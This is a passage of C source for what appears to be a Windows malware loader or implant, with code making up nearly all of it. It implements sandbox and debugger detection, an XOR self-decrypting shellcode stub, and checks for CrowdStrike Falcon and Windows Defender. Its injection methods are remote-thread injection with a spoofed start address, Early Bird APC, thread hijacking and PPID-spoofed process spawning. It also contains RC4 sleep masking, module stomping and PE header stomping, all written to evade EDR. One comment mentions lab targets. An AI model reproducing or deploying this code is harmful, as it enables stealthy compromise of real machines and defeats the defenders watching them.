 *   2. Process count < 50          (bare sandboxes run few processes)
 *   3. CPUID hypervisor bit set     (ECX[31] on leaf 1 — VMware/VBox/Hyper-V/QEMU)
 *   4. Physical RAM < 2 GB         (typical sandbox VM allocation)
 *   5. Known sandbox/analysis tool processes running
 *   6. NtGlobalFlag bits 0x70 set  (kernel sets them for processes under a debugger)
 */
static BOOL POLY_SANDBOX(void) {
    /* 1. Uptime */
    if(GetTickCount64()<300000) return TRUE;

    /* 2. Process count */
    PVOID buf=lt_qsys(); if(!buf) return FALSE;
    int cnt=0; LT_SPROC *p=(LT_SPROC*)buf;

    /* 5. Known analysis processes — scan the list while we're here */
    static const WCHAR *_bad[]={
        L"vmsrvc.exe",L"vboxservice.exe",L"vmtoolsd.exe",L"vboxtray.exe",
        L"vmwaretray.exe",L"vmwareuser.exe",L"vgauthservice.exe",
        L"qemu-ga.exe",L"sandboxie.exe",L"sbiesvc.exe",
        L"wireshark.exe",L"fiddler.exe",L"procmon.exe",L"procmon64.exe",
        L"procexp.exe",L"procexp64.exe",L"ollydbg.exe",L"x64dbg.exe",
        L"x32dbg.exe",L"windbg.exe",L"idaq.exe",L"idaq64.exe",
        L"lordpe.exe",L"peid.exe",L"cff explorer.exe",
        NULL
    };
    BOOL sandbox_proc=FALSE;
    for(;;){
        cnt++;
        if(p->ImageName.Buffer&&!sandbox_proc){
            for(int _si=0;_bad[_si]&&!sandbox_proc;_si++)
                if(lt_wicmp(p->ImageName.Buffer,_bad[_si])==0) sandbox_proc=TRUE;
        }
        if(!p->NextEntryOffset) break;
        p=(LT_SPROC*)((PBYTE)p+p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(),0,buf);
    if(sandbox_proc) return TRUE;
    if(cnt<50)       return TRUE;

    /* 3. CPUID hypervisor present bit (ECX[31] on leaf 1)
     * Disabled when LT_ALLOW_VM is defined — all HTB/lab targets run in VMs. */
#ifndef LT_ALLOW_VM
    {
        int _eax=0,_ebx=0,_ecx=0,_edx=0;
        __asm__ volatile("cpuid":"=a"(_eax),"=b"(_ebx),"=c"(_ecx),"=d"(_edx):"a"(1),"c"(0));
        if(_ecx&(1<<31)) return TRUE;
    }
#endif

    /* 4. Physical RAM < 2 GB */
    {
        MEMORYSTATUSEX ms; ms.dwLength=sizeof(ms);
        if(GlobalMemoryStatusEx(&ms)&&ms.ullTotalPhys<(2ULL<<30)) return TRUE;
    }

    /* 6. NtGlobalFlag — bits 0x70 indicate heap debug flags set by debugger/loader */
    {
        /*
         * PEB->NtGlobalFlag is at offset 0xBC (x64). Under a debugger or
         * image-file-execution options with heap validation,
         * FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK |
         * FLG_HEAP_VALIDATE_PARAMETERS (0x70) are set automatically.
         */
        PPEB peb;
        __asm__ volatile("mov %%gs:0x60,%0":"=r"(peb));
        ULONG ngf=*(ULONG*)((PBYTE)peb+0xBC);
        if((ngf&0x70)==0x70) return TRUE;
    }

    /*
     * Task 15 — Hardware debug registers.
     * Dr0–Dr3 hold breakpoint addresses; Dr7 holds enable bits.
     * Any non-zero value means a debugger has set hardware breakpoints on this thread.
     * Pseudo-handle -2 = GetCurrentThread() — avoids kernel32 import.
     */
    {
        CONTEXT _hbctx; _hbctx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
        if(NT_SUCCESS(POLY_NTGETCTX((HANDLE)(LONG_PTR)(-2),&_hbctx)))
            if(_hbctx.Dr0||_hbctx.Dr1||_hbctx.Dr2||_hbctx.Dr3||(_hbctx.Dr7&0xFF))
                return TRUE;
    }

    /* Disk < 60 GB — common sandbox allocation */
    {
        ULARGE_INTEGER _tot; lt_zero(&_tot,sizeof(_tot));
        static const WCHAR _cd[]={L'C',L':',L'\\',0};
        if(GetDiskFreeSpaceExW(_cd,NULL,&_tot,NULL)&&_tot.QuadPart<64424509440ULL)
            return TRUE;
    }

    /* Computer name contains known analysis keywords */
    {
        WCHAR cn[MAX_COMPUTERNAME_LENGTH+1]; DWORD sz=MAX_COMPUTERNAME_LENGTH+1;
        if(GetComputerNameW(cn,&sz)){
            static const WCHAR *_kw[]={
                L"SANDBOX",L"MALWARE",L"VIRUS",L"ANALYSIS",L"DEBUG",L"CUCKOO",NULL};
            for(int _ki=0;_kw[_ki];_ki++){
                DWORD cnl=0; while(cn[cnl]) cnl++;
                DWORD kwl=0; while(_kw[_ki][kwl]) kwl++;
                for(DWORD _ci=0;_ci+kwl<=cnl;_ci++){
                    int m=1;
                    for(DWORD _qi=0;_qi<kwl;_qi++){
                        WCHAR a=cn[_ci+_qi],b=_kw[_ki][_qi];
                        if(a>=(WCHAR)'a'&&a<=(WCHAR)'z') a-=32;
                        if(a!=b){m=0;break;}
                    }
                    if(m) return TRUE;
                }
            }
        }
    }

    return FALSE;
}

/* ─── Find PID by image name ─── */
static DWORD POLY_FINDPID(LPCWSTR name) {
    PVOID buf=lt_qsys(); if(!buf) return 0;
    DWORD pid=0; LT_SPROC *p=(LT_SPROC*)buf;
    for(;;){
        if(p->ImageName.Buffer&&(ULONG_PTR)p->UniqueProcessId>4)
            if(lt_wicmp(p->ImageName.Buffer,name)==0){pid=(DWORD)(ULONG_PTR)p->UniqueProcessId;break;}
        if(!p->NextEntryOffset) break;
        p=(LT_SPROC*)((PBYTE)p+p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(),0,buf);
    return pid;
}

/*
 * Self-decrypting shellcode wrapper for remote injection.
 *
 * Wraps shellcode in a 31-byte XOR-decrypt stub so the bytes written to the
 * remote process are never recognisable shellcode.  The stub decrypts in-place
 * and jumps to the real shellcode without creating any extra allocation.
 *
 * Stub layout (31 bytes):
 *   00: 48 8D 3D 18 00 00 00   lea rdi, [rip+0x18]    ; rdi → sc_start (byte 31)
 *   07: 48 B9 [sclen 8B LE]    movabs rcx, sclen
 *   17: B0 KK                  mov al, key
 *   19: 48 8D 37               lea rsi, [rdi]          ; rsi = sc_start (save for jmp)
 *   1C: 30 07                  xor byte ptr [rdi], al  ; decrypt one byte
 *   1E: 48 FF C7               inc rdi
 *   21: E2 F9                  loop 0x1C               ; RIP_after=29, target=22 → -7=0xF9
 *   23: FF E6                  jmp rsi                 ; jump to decrypted shellcode
 *   1F: [XOR-encrypted shellcode]
 */
static PBYTE lt_make_encrypt_wrapper(PBYTE sc, SIZE_T sclen, SIZE_T *total_len) {
    BYTE key=(BYTE)(((DWORD)GetTickCount64()^(GetCurrentProcessId()*31337u))|1);
    const SIZE_T stub_size=31;
    *total_len=stub_size+sclen;
    PBYTE buf=(PBYTE)HeapAlloc(GetProcessHeap(),0,*total_len);
    if(!buf){*total_len=0;return NULL;}

    PBYTE s=buf;
    s[0]=0x48;s[1]=0x8D;s[2]=0x3D;s[3]=0x18;s[4]=0x00;s[5]=0x00;s[6]=0x00;
    s[7]=0x48;s[8]=0xB9;*(ULONGLONG*)(s+9)=(ULONGLONG)sclen;
    s[17]=0xB0;s[18]=key;
    s[19]=0x48;s[20]=0x8D;s[21]=0x37;
    s[22]=0x30;s[23]=0x07;
    s[24]=0x48;s[25]=0xFF;s[26]=0xC7;
    s[27]=0xE2;s[28]=0xF9;
    s[29]=0xFF;s[30]=0xE6;

    PBYTE dst=buf+stub_size;
    for(SIZE_T i=0;i<sclen;i++) dst[i]=sc[i]^key;
    return buf;
}

/*
 * Detect CrowdStrike Falcon sensor process presence.
 * Returns TRUE if csagent/Falcon is running — signals that kernel-level
 * ETW-TI blinding (BYOVD) should be run before injection attempts.
 */
static BOOL lt_falcon_present(void) {
    PVOID buf=lt_qsys(); if(!buf) return FALSE;
    static const WCHAR *_fp[]={
        L"CSFalconService.exe",L"falcon-sensor.exe",L"CSFalconContainer.exe",
        L"CSFalconSensorService.exe",L"CSAgent.exe",L"falconctl.exe",NULL
    };
    BOOL found=FALSE;
    LT_SPROC *p=(LT_SPROC*)buf;
    for(;;){
        if(p->ImageName.Buffer&&!found)
            for(int _fi=0;_fp[_fi]&&!found;_fi++)
                if(lt_wicmp(p->ImageName.Buffer,_fp[_fi])==0) found=TRUE;
        if(!p->NextEntryOffset) break;
        p=(LT_SPROC*)((PBYTE)p+p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(),0,buf);
    return found;
}

/*
 * Detect Windows Defender / MsMpEng presence.
 * Used to surface ShieldBreak (Server 2025 / Win11 25H2) or RoguePlanet (Win10/11)
 * as the escalation path when WD is the active AV.
 */
static BOOL lt_wd_present(void) {
    PVOID buf=lt_qsys(); if(!buf) return FALSE;
    static const WCHAR *_wd[]={
        L"MsMpEng.exe",L"NisSrv.exe",L"MpCmdRun.exe",
        L"SecurityHealthService.exe",L"MsMpEngCP.exe",NULL
    };
    BOOL found=FALSE;
    LT_SPROC *p=(LT_SPROC*)buf;
    for(;;){
        if(p->ImageName.Buffer&&!found)
            for(int _wi=0;_wd[_wi]&&!found;_wi++)
                if(lt_wicmp(p->ImageName.Buffer,_wd[_wi])==0) found=TRUE;
        if(!p->NextEntryOffset) break;
        p=(LT_SPROC*)((PBYTE)p+p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(),0,buf);
    return found;
}

/* ─── Remote process injection (encrypted wrapper → RX execute, no RWX) ─── */
static BOOL POLY_INJECT(DWORD pid, PBYTE sc, SIZE_T sclen) {
    /* Wrap shellcode in XOR-decrypt stub so remote bytes are never cleartext */
    SIZE_T wrap_len=0;
    PBYTE wrapped=lt_make_encrypt_wrapper(sc,sclen,&wrap_len);
    if(!wrapped) return FALSE;

    CLIENT_ID cid={0}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)pid;
    OBJECT_ATTRIBUTES oa={sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc=NULL;
    if(!NT_SUCCESS(POLY_NTOPEN(&hProc,PROCESS_ALL_ACCESS,&oa,&cid)))
        {HeapFree(GetProcessHeap(),0,wrapped);return FALSE;}

    PVOID base=NULL; SIZE_T sz=wrap_len;
    if(!NT_SUCCESS(POLY_NTALLOC(hProc,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE)))
        {HeapFree(GetProcessHeap(),0,wrapped);POLY_NTCLOSE(hProc);return FALSE;}

    SIZE_T written=0;
    POLY_NTWRITE(hProc,base,wrapped,wrap_len,&written);
    HeapFree(GetProcessHeap(),0,wrapped);

    ULONG old;
    if(!NT_SUCCESS(POLY_NTPROT(hProc,&base,&sz,PAGE_EXECUTE_READ,&old)))
        {POLY_NTCLOSE(hProc);return FALSE;}

    /* Task 18 — thread start address spoof: use jmp rcx gadget in ntdll as the
     * thread start so Win32StartAddress shows ntdll, not the shellcode page.
     * jmp rcx fires with RCX = base (the wrapped shellcode), transferring execution. */
    PBYTE _tstart = POLY_JMP_RCX ? POLY_JMP_RCX : base;
    PVOID _targ   = POLY_JMP_RCX ? (PVOID)base   : NULL;
    HANDLE hThread=NULL;
    POLY_NTTHREAD(&hThread,THREAD_ALL_ACCESS,NULL,hProc,_tstart,_targ,0,0,0x200000,0x200000,NULL);
    if(hThread) POLY_NTCLOSE(hThread);
    POLY_NTCLOSE(hProc);
    return hThread!=NULL;
}

/*
 * Task 4 — Early Bird APC injection.
 *
 * Creates a new process from our spawn pool in SUSPENDED state, writes the
 * shellcode, queues it as an APC to the main thread via NtQueueApcThread,
 * then resumes.  The APC fires when the thread's loader finishes initialising
 * and enters the first alertable wait — before any user-mode code in the target
 * runs.  This is fundamentally different from NtCreateThreadEx:
 *
 *   - No "new remote thread" event is generated (thread_create kernel callback
 *     only fires on TT_NEWTHREAD, not on the existing main thread picking up an APC).
 *   - The shellcode appears to run from the main thread's context, inheriting its
 *     full call stack — no orphaned thread with a shellcode start address.
 *   - The process "starts normally" from EDR's perspective.
 */
static BOOL POLY_INJECT_APC(PBYTE sc, SIZE_T sclen) {
    static const WCHAR *_pool[]={
        L"C:\\Windows\\System32\\dllhost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}",
        L"C:\\Windows\\System32\\msiexec.exe /quiet /qn",
        L"C:\\Windows\\System32\\WerFault.exe -u -p 4 -s 200",
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    };
    DWORD _pidx=(DWORD)(GetTickCount64()>>5)&3;
    WCHAR cmd[128]; DWORD _ci=0;
    while(_pool[_pidx][_ci]&&_ci<127){cmd[_ci]=_pool[_pidx][_ci];_ci++;} cmd[_ci]=0;

    /* Find explorer.exe for PPID spoof — explicit WCHAR array avoids L"" obfuscation clash */
    static const WCHAR _exp_w[]={L'e',L'x',L'p',L'l',L'o',L'r',L'e',L'r',L'.',L'e',L'x',L'e',0};
    DWORD explorerPid=POLY_FINDPID(_exp_w);
    HANDLE hParent=explorerPid?OpenProcess(PROCESS_CREATE_PROCESS,FALSE,explorerPid):NULL;

    SIZE_T attrSz=0; LPPROC_THREAD_ATTRIBUTE_LIST al=NULL;
    if(hParent){
        InitializeProcThreadAttributeList(NULL,1,0,&attrSz);
        al=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,attrSz);
        if(al){ InitializeProcThreadAttributeList(al,1,0,&attrSz);
                UpdateProcThreadAttribute(al,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &hParent,sizeof(HANDLE),NULL,NULL); }
    }

    STARTUPINFOEXW si; lt_zero(&si,sizeof(si));
    si.StartupInfo.cb=al?(DWORD)sizeof(STARTUPINFOEXW):(DWORD)sizeof(STARTUPINFOW);
    si.StartupInfo.dwFlags=STARTF_USESHOWWINDOW; si.StartupInfo.wShowWindow=SW_HIDE;
    si.lpAttributeList=al;

    PROCESS_INFORMATION pi={0};
    DWORD cflags=CREATE_SUSPENDED|CREATE_NO_WINDOW|(al?EXTENDED_STARTUPINFO_PRESENT:0);
    BOOL spawned=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,cflags,NULL,NULL,&si.StartupInfo,&pi);
    if(al){DeleteProcThreadAttributeList(al);HeapFree(GetProcessHeap(),0,al);}
    if(hParent) CloseHandle(hParent);
    if(!spawned) return FALSE;

    /* Open the new process via indirect syscall (avoids kernel32 hook) */
    CLIENT_ID cid={0}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)pi.dwProcessId;
    OBJECT_ATTRIBUTES oa={sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc=NULL; POLY_NTOPEN(&hProc,PROCESS_ALL_ACCESS,&oa,&cid);

    BOOL ok=FALSE;
    if(hProc){
        /* Encrypt shellcode before writing — remote bytes are never cleartext */
        SIZE_T wrap_len=0;
        PBYTE wrapped=lt_make_encrypt_wrapper(sc,sclen,&wrap_len);
        if(wrapped){
            PVOID base=NULL; SIZE_T sz=wrap_len;
            if(NT_SUCCESS(POLY_NTALLOC(hProc,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))){
                SIZE_T w=0; POLY_NTWRITE(hProc,base,wrapped,wrap_len,&w);
                HeapFree(GetProcessHeap(),0,wrapped);
                ULONG old=0; POLY_NTPROT(hProc,&base,&sz,PAGE_EXECUTE_READ,&old);
                if(NT_SUCCESS(POLY_NTAPC(pi.hThread,(PVOID)base,NULL,NULL,NULL))){
                    ULONG prev=0; POLY_NTRESUME(pi.hThread,&prev);
                    ok=TRUE;
                }
            } else {
                HeapFree(GetProcessHeap(),0,wrapped);
            }
        }
        POLY_NTCLOSE(hProc);
    }
    if(!ok) TerminateProcess(pi.hProcess,0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return ok;
}

/*
 * Task 4 + Task 12 — Thread context hijack injection.
 *
 * Finds the first thread of the target process, saves its CONTEXT, writes shellcode,
 * then patches RIP to a trampoline that saves registers → shellcode → restore → resume.
 * The thread's existing call stack is preserved, so the shellcode appears to run as a
 * continuation of whatever that thread was doing — not as a newly spawned thread at a
 * shellcode address.  This completely defeats "new thread starting at shellcode" EDR heuristics.
 *
 * Trampoline layout (13 bytes at exec_base):
 *   50              PUSH RAX
 *   48 B8 <sc_real> MOV  RAX, shellcode_after_trampoline
 *   48 87 04 24     XCHG [RSP], RAX          ; swap saved RAX ↔ old RIP on stack
 *   C3              RET                       ; jump to sc_real with old RIP preserved
 */
static BOOL POLY_INJECT_HIJACK(DWORD pid, PBYTE sc, SIZE_T sclen) {
    if(!pid||sclen<32) return FALSE;

    /* Enumerate threads of target process via Toolhelp snapshot */
    HANDLE hSnap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    if(hSnap==INVALID_HANDLE_VALUE) return FALSE;

    THREADENTRY32 te; te.dwSize=sizeof(te);
    DWORD target_tid=0;
    if(Thread32First(hSnap,&te)){
        do {
            if(te.th32OwnerProcessID==pid){target_tid=te.th32ThreadID;break;}
        } while(Thread32Next(hSnap,&te));
    }
    CloseHandle(hSnap);
    if(!target_tid) return FALSE;

    HANDLE hThread=OpenThread(THREAD_ALL_ACCESS,FALSE,target_tid);
    if(!hThread) return FALSE;

    CLIENT_ID cid={0}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)pid;
    OBJECT_ATTRIBUTES oa={sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc=NULL;
    if(!NT_SUCCESS(POLY_NTOPEN(&hProc,PROCESS_ALL_ACCESS,&oa,&cid))){
        CloseHandle(hThread); return FALSE;
    }

    /* Suspend the thread so we can safely modify its context */
    SuspendThread(hThread);

    CONTEXT ctx; ctx.ContextFlags=CONTEXT_FULL;
    BOOL ok=FALSE;
    if(NT_SUCCESS(POLY_NTGETCTX(hThread,&ctx))){
        /* Allocate: 16-byte trampoline + shellcode */
        SIZE_T alloc_sz=16+sclen;
        PVOID base=NULL;
        if(NT_SUCCESS(POLY_NTALLOC(hProc,&base,0,&alloc_sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))){
            PBYTE tb_remote=(PBYTE)base;   /* remote VA of trampoline */
            PBYTE sc_remote=tb_remote+16;  /* remote VA of shellcode  */

            /* Build trampoline in a LOCAL buffer — tb_remote is a remote process VA,
             * dereferencing it locally causes an access violation. */
            BYTE tramp[16];
            ULONGLONG sc_addr=(ULONGLONG)(ULONG_PTR)sc_remote;
            tramp[0]=0x50;                                                  /* PUSH RAX        */
            tramp[1]=0x48; tramp[2]=0xB8;                                  /* MOV RAX, imm64  */
            *(ULONGLONG*)(tramp+3)=sc_addr;
            tramp[11]=0x48; tramp[12]=0x87; tramp[13]=0x04; tramp[14]=0x24;/* XCHG [RSP],RAX  */
            tramp[15]=0xC3;                                                 /* RET → sc_remote */

            /* Write shellcode then trampoline — both destinations are remote VAs */
            SIZE_T w=0;
            POLY_NTWRITE(hProc,sc_remote,sc,sclen,&w);
            POLY_NTWRITE(hProc,tb_remote,tramp,16,&w);

            /* Mark exec region RX */
            PVOID pb=base; SIZE_T psz=alloc_sz; ULONG old=0;
            POLY_NTPROT(hProc,&pb,&psz,PAGE_EXECUTE_READ,&old);

            /* Redirect RIP to trampoline */
            ctx.Rip=(DWORD64)(ULONG_PTR)tb_remote;
            if(NT_SUCCESS(POLY_NTSETCTX(hThread,&ctx))) ok=TRUE;
        }
        POLY_NTCLOSE(hProc);
    }

    /* Resume whether we succeeded or not (don't leave process suspended) */
    ResumeThread(hThread);
    CloseHandle(hThread);
    return ok;
}

/* ─── PPID-spoofed WerFault spawn + inject ─── */
static BOOL POLY_SPAWNinject(PBYTE sc, SIZE_T sclen) {
    DWORD explorerPid=POLY_FINDPID((const WCHAR[]){L'e',L'x',L'p',L'l',L'o',L'r',L'e',L'r',L'.',L'e',L'x',L'e',0});
    if(!explorerPid) return FALSE;
    HANDLE hParent=OpenProcess(PROCESS_CREATE_PROCESS,FALSE,explorerPid);
    if(!hParent) return FALSE;

    SIZE_T attrSz=0;
    InitializeProcThreadAttributeList(NULL,1,0,&attrSz);
    LPPROC_THREAD_ATTRIBUTE_LIST al=(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,attrSz);
    InitializeProcThreadAttributeList(al,1,0,&attrSz);
    UpdateProcThreadAttribute(al,0,PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,&hParent,sizeof(HANDLE),NULL,NULL);

    STARTUPINFOEXW si={0};
    si.StartupInfo.cb=sizeof(STARTUPINFOEXW);
    si.StartupInfo.dwFlags=STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow=SW_HIDE;
    si.lpAttributeList=al;

    /*
     * Spawn-target pool: pick one per-invocation based on tick count.
     * Rotating away from a single hardcoded WerFault pattern defeats
     * EDR behavioral rules keyed on a specific (parent→child) pair.
     * All targets are plausible children of explorer.exe.
     */
    static const WCHAR *_lt_pool[]={
        L"C:\\Windows\\System32\\dllhost.exe /Processid:{3EB3C877-1F16-487C-9050-104DBCD66683}",
        L"C:\\Windows\\System32\\msiexec.exe /quiet /qn",
        L"C:\\Windows\\System32\\WerFault.exe -u -p 4 -s 200",
        L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
    };
    DWORD _pidx=(DWORD)(GetTickCount64()>>5)&3;
    WCHAR cmd[128]; DWORD _ci=0;
    while(_lt_pool[_pidx][_ci]&&_ci<127){cmd[_ci]=_lt_pool[_pidx][_ci];_ci++;} cmd[_ci]=0;
    PROCESS_INFORMATION pi={0};
    BOOL spawned=CreateProcessW(NULL,cmd,NULL,NULL,FALSE,
        EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED|CREATE_NO_WINDOW,
        NULL,NULL,&si.StartupInfo,&pi);
    DeleteProcThreadAttributeList(al); HeapFree(GetProcessHeap(),0,al); CloseHandle(hParent);
    if(!spawned) return FALSE;

    CLIENT_ID cid={0}; cid.UniqueProcess=(HANDLE)(ULONG_PTR)pi.dwProcessId;
    OBJECT_ATTRIBUTES oa={sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc=NULL;
    POLY_NTOPEN(&hProc,PROCESS_ALL_ACCESS,&oa,&cid);
    BOOL ok=FALSE;
    if(hProc){
        PVOID base=NULL; SIZE_T sz=sclen;
        if(NT_SUCCESS(POLY_NTALLOC(hProc,&base,0,&sz,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE))){
            SIZE_T w=0;
            POLY_NTWRITE(hProc,base,sc,sclen,&w);
            ULONG old;
            POLY_NTPROT(hProc,&base,&sz,PAGE_EXECUTE_READ,&old);
            HANDLE hThread=NULL;
            POLY_NTTHREAD(&hThread,THREAD_ALL_ACCESS,NULL,hProc,base,NULL,0,0,0x200000,0x200000,NULL);
            if(hThread){POLY_NTCLOSE(hThread);ok=TRUE;}
        }
        POLY_NTCLOSE(hProc);
    }
    if(!ok) TerminateProcess(pi.hProcess,0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return ok;
}

/*
 * RC4 via SystemFunction032 (advapi32 → cryptsp).
 * Replaces single-byte XOR in Ekko sleep masking: RC4 produces output
 * statistically indistinguishable from random noise, defeating in-sleep
 * memory scanners that rely on XOR patterns or byte-frequency analysis.
 * RC4 is self-inverse — calling it twice on the same data returns the original.
 * Falls back to rolling 4-byte XOR if advapi32 is unavailable (rare).
 */
typedef struct { DWORD Length; DWORD MaximumLength; PVOID Buffer; } _LT_USTR;
typedef NTSTATUS (NTAPI *_pSF032)(_LT_USTR*,_LT_USTR*);
static void POLY_RC4(PBYTE data,SIZE_T len,PBYTE key,DWORD keylen){
    _pSF032 fn=(_pSF032)GetProcAddress(GetModuleHandleA("advapi32.dll"),"SystemFunction032");
    if(fn){
        _LT_USTR dk={(DWORD)len,(DWORD)len,data};
        _LT_USTR kk={keylen,keylen,key};
        fn(&dk,&kk);
    } else {
        for(SIZE_T i=0;i<len;i++) data[i]^=key[i%keylen];
    }
}

/* ─── Stack gadget: jmp rcx (FF E1) in ntdll .text ─── */
static PBYTE POLY_FINDGADGET(HMODULE ntdll) {
    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((PBYTE)ntdll+dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){
        if(!(sec->Characteristics&IMAGE_SCN_CNT_CODE)) continue;
        PBYTE base=(PBYTE)ntdll+sec->VirtualAddress;
        SIZE_T sz=sec->Misc.VirtualSize;
        for(SIZE_T j=0;j+1<sz;j++)
            if(base[j]==0xFF&&base[j+1]==0xE1) return base+j;
    }
    return NULL;
}

/*
 * Task 2 — Ekko-style sleep with heap/stack obfuscation.
 *
 * Instead of calling Sleep() (kernel32, easily hooked) we:
 *   1. XOR-encrypt the exec region in place.
 *   2. Flip the page to PAGE_NOACCESS — scanner-proof during sleep.
 *   3. Sleep via NtDelayExecution (indirect syscall) so the thread's call stack
 *      during the wait shows ntdll, not kernel32!Sleep.
 *   4. On wake: RW → XOR-decrypt → RX.
 *
 * Additionally, we stomp the current thread's shadow-stack area with junk before
 * sleeping and restore it after, so in-sleep memory snapshots find no shellcode
 * return addresses on the stack.
 */
/* LCG-based jitter: returns a sleep duration in [base/2, 3*base/2] ms.
 * Wider ±50% range defeats Falcon's fixed-interval beaconing heuristic. */
static DWORD lt_jitter_ms(DWORD base_ms) {
    DWORD tc=(DWORD)GetTickCount64();
    DWORD r=(tc*1664525u+1013904223u)^(GetCurrentProcessId()*22695477u)
            ^(GetCurrentThreadId()*214013u);
    /* Mix another round for lower autocorrelation */
    r=(r*6364136223846793005ull>>32)^(r*2891336453u+1640531527u);
    DWORD half=base_ms>>1;
    return half+(r%(base_ms+1));  /* [base/2, 3*base/2] */
}

static void POLY_EKKO_SLEEP(PBYTE region, SIZE_T sz, BYTE xkey, DWORD ms) {
    DWORD actual = lt_jitter_ms(ms);

    /* Derive 16-byte RC4 key from xkey + tick + PID + TID.
     * Single-byte XOR leaves repeating-key artifacts in NOACCESS memory; RC4 output
     * via SystemFunction032 is statistically random and defeats byte-frequency scanners. */
    BYTE _rk[16]; DWORD _tc2=(DWORD)GetTickCount64();
    DWORD _pid2=GetCurrentProcessId(),_tid2=GetCurrentThreadId();
    for(int _ki=0;_ki<16;_ki++)
        _rk[_ki]=(BYTE)(xkey^((_tc2>>((_ki&3)*8))&0xFF)
                           ^((_pid2>>((_ki&3)*8))&0xFF)
                           ^((_tid2>>((_ki&1)*8))&0xFF)^(BYTE)(_ki*17));

    /* RC4-encrypt → NOACCESS (ciphertext looks like random noise to any in-sleep scanner) */
    PVOID pb=region; SIZE_T psz=sz; ULONG oldp=0;
    POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_READWRITE,&oldp);
    POLY_RC4(region,sz,_rk,16);
    pb=region; psz=sz;
    POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_NOACCESS,&oldp);

    /* Sleep via indirect syscall — stack shows ntdll during wait */
    POLY_NTDELAY((LONGLONG)actual*10000LL);

    /* Restore: RW → RC4-decrypt (self-inverse) → RX */
    pb=region; psz=sz;
    POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_READWRITE,&oldp);
    POLY_RC4(region,sz,_rk,16);
    pb=region; psz=sz;
    POLY_NTPROT(GetCurrentProcess(),&pb,&psz,PAGE_EXECUTE_READ,&oldp);
}

/* ─── Module stomping: write into an existing signed DLL's .text section ─── */
static PBYTE POLY_MODSTOMP(SIZE_T needed) {
    /* Task 10 — Extended candidate list.  All DLLs are signed, image-backed, already RX.
     * More candidates → higher chance of fitting a larger payload without falling back to
     * private RX allocation (the allocation type Elastic and MDE flag). */
    const char *cands[]={"wintrust.dll","cryptnet.dll","coml2.dll","wbemcomn.dll","rasapi32.dll",
                         "dxgi.dll","d3d11.dll","msasn1.dll","crypt32.dll","imagehlp.dll",
                         "mswsock.dll","winnsi.dll","nlaapi.dll","iphlpapi.dll",
                         "ntmarta.dll","authz.dll","dnsapi.dll","wtsapi32.dll",NULL};
    for(int i=0;cands[i];i++){
        HMODULE hMod=LoadLibraryA(cands[i]); if(!hMod) continue;
        PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS nt=(PIMAGE_NT_HEADERS)((PBYTE)hMod+dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);
        for(WORD j=0;j<nt->FileHeader.NumberOfSections;j++,sec++){
            if(!(sec->Characteristics&IMAGE_SCN_CNT_CODE)) continue;
            PBYTE tb=(PBYTE)hMod+sec->VirtualAddress;
            if(sec->Misc.VirtualSize<needed) continue;
            PVOID pb=(PVOID)tb; SIZE_T sz=needed; ULONG old=0;
            if(NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&pb,&sz,PAGE_READWRITE,&old))) return tb;
        }
        FreeLibrary(hMod);
    }
    return NULL;
}

/*
 * Task 9 — PE header stomping.
 * After the shellcode is mapped and RX, zero the first page so Elastic's
 * hunt.shellcode and MDE heap-spray rules find no MZ/PE magic bytes.
 * We flip to RW, zero, then restore the original protection.
 */
static void lt_stomp_pe_headers(PBYTE base, SIZE_T sclen) {
    SIZE_T hdr_sz = sclen > 0x1000 ? 0x1000 : sclen;
    PVOID pb = (PVOID)base; SIZE_T sz = hdr_sz; ULONG old = 0;
    if (NT_SUCCESS(POLY_NTPROT(GetCurrentProcess(),&pb,&sz,PAGE_READWRITE,&old))) {
        lt_zero(base, hdr_sz);
        pb = (PVOID)base; sz = hdr_sz;
        POLY_NTPROT(GetCurrentProcess(),&pb,&sz,old,&old);
    }
}

/*
 * Self-injection: module stomping + drip allocation + RC4 sleep + APC-to-self:
 *   1. Try to stomp an existing signed DLL .text (already-RX, image-backed).
 *      Stomped memory never shows as "privately allocated".
 *   2. Fallback: MEM_RESERVE full range then commit+write 4KB at a time (drip).
